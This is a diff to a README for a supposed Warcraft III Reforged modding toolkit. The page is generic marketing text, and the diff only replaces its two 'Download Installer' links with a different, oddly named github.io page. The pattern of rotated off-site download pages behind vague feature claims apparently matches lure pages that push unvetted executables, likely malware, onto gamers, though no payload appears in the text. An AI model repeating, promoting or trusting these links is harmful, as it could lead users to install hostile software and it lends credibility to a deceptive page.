@@ -2,7 +2,7 @@
 
 Discover the Warcraft III Reforged Enhancement Toolkit, your all-in-one solution for modding and customizing Warcraft III Reforged on Windows 10 and 11. This powerful suite of tools is designed to elevate your gaming experience by offering advanced customization options, performance enhancements, and easy mod management. Whether you're looking to tweak graphics, unlock hidden features, or streamline your setup, this toolkit provides everything you need in one convenient package.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ The Warcraft III Reforged Enhancement Toolkit is provided as-is for educational 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 Last Updated: November 2026
 
